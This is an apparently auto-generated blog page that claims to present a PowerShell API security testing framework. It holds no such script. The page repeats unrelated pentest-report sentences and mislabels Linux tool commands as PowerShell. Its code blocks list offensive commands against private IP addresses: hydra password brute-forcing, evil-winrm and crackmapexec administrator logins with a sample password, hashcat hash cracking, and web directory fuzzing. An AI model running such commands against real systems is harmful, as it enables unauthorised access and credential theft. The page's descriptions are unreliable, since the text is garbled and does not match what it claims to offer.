---
TitleSEO: "API Security Testing Framework in PowerShell | ZureFX"
TitlePost: "API Security Testing Framework — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for api security testing framework. Built for security research and automation."
Keywords: "fuzzer, scanner, python, automation, powershell"
URL: "https://zurefx.github.io/scripting/script-api-security-testing-framework-886.html"
URL_IMAGES: ""
Date: "2025-02-06"
Tags: "Fuzzer, Scanner, Python, Automation, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-api-security-testing-framework-886"
Permalink: "/scripting/script-api-security-testing-framework-886.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `mimikatz`
- `ffuf`
- `ligolo-ng`

## Implementation

### Core Logic

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.77.221.50/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.227.97 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.23.54.23/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
evil-winrm -i 10.102.82.82 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p3268,8080,464 10.104.230.207 -oN scan.txt
crackmapexec smb 10.73.194.23 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.73.205.191/FUZZ
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
feroxbuster -h
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 2 results
[+] Done in 21.27s
```
